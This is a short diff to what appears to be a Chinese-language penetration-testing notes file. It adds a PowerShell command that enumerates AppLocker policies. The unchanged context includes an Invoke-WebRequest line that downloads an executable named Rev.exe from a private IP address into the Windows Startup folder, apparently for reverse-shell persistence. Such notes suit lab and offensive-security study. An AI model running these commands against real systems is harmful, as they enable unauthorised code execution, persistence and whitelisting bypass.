@@ -124,3 +124,8 @@ $method.Invoke(0, $null)
 ```
 Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
 ```
+
+# 枚举所有Applocker策略
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
